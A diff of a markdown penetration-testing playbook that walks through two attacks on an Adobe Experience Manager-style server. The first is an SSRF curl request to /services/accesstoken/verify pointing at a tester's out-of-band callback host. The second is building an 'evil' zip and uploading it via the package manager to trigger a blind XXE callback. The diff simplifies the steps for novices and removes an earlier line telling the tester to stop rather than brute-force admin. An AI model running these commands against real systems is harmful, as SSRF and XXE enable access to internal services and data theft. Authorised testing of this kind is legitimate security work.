@@ -1,41 +1,47 @@
-# Batch 15 — Modern AEM: SSRF + package-manager XXE
+# Batch 15 — SSRF + package XXE
 
-## objective
+## GOAL
+1) Make server call **your** URL (SSRF).  
+2) Upload tiny evil zip → blind XXE callback.
 
-Test two **modern research** primitives (Assetnote/Searchlight):  
-1) SSRF via access-token verify  
-2) Blind XXE during package upload validation  
+## TIME
+~1 hour
 
-No EL/write chains here (that is batch 16).
-
-## estimated_time
-
-60–90 minutes
-
-## prerequisites
-
+## YOU NEED
 - OAST URL  
-- Upload/SSRF allowed in scope  
-- Dispatcher bypass from earlier if paths 404
+- Upload/SSRF allowed  
 
-## testing_workflow
+---
 
-### 1) Technique A — SSRF endpoint
+## WHY (30 seconds)
+
+**SSRF** = server fetches a URL you choose (can hit cloud metadata / internal apps).  
+**Package XXE** = even failed package upload may parse XML inside the zip; bad parser hits your server.  
+
+You do not need full RCE here. Callback = proof.
+
+---
+
+## DO THIS
 
 ```bash
-T="https://TARGET"
+T="https://PUT-THE-SITE-HERE"
 COLLAB="http://YOUR-OAST"
-
-curl -sk -D- -X POST "$T/services/accesstoken/verify" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  --data-urlencode "auth_url=$COLLAB" | head -40
 ```
 
-If 404, retry with your **working bypass wrapper** patterns from 04–06 (same path mutations you used for QueryBuilder).
+### 1) SSRF door
 
-Check collaborator for hit; note if response body reflects fetch output (full-read SSRF).
+```bash
+curl -sk -D- -X POST "$T/services/accesstoken/verify" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode "auth_url=$COLLAB" | head -30
+```
 
-### 2) Technique B — build minimal evil package (offline)
+404? Retry with the **same URL tricks** that worked for QueryBuilder in 04–06.
+
+Watch OAST for hit. If response body shows remote page → full-read SSRF.
+
+### 2) Build evil zip offline
 
 ```bash
 mkdir -p /tmp/evilpkg/jcr_root /tmp/evilpkg/META-INF/vault
@@ -46,28 +52,24 @@ EOF
 cd /tmp/evilpkg && zip -r /tmp/evil.zip jcr_root META-INF
 ```
 
-### 3) Technique C — upload via packmgr if reachable
+### 3) Upload if packmgr open
 
 ```bash
 curl -sk -o /dev/null -w "packmgr:%{http_code}\n" "$T/crx/packmgr/index.jsp"
-# Upload evil.zip via UI or /crx/packmgr/service/exec.json if allowed
-# Success metric: OAST callback even when install fails
+# Upload /tmp/evil.zip in UI or API if allowed
+# Win = OAST /xxe hit even if install fails
 ```
 
-If packmgr auth-walled, document and stop — do not brute admin.
+---
 
-## decision_points
+## IF / THEN
 
-| If… | Then… |
-|-----|--------|
-| SSRF full read | High impact; optional internal port notes |
-| Blind XXE callback only | Still valid; limited exfil expectations |
-| Both dead | Continue **16** if write endpoints interesting; else assessment AEM track nearly done |
+| What you saw | What you do |
+|--------------|-------------|
+| SSRF and/or XXE callback | Document → **16** |
+| Both closed | Still try **16** once; then board done |
 
-## expected_findings
+---
 
-- SSRF, blind XXE pre-install validation
-
-## next_batch_to_continue_with
-
-→ **[16-modern-write-el.md](./16-modern-write-el.md)**
+## NEXT
+→ [16-modern-write-el.md](./16-modern-write-el.md)
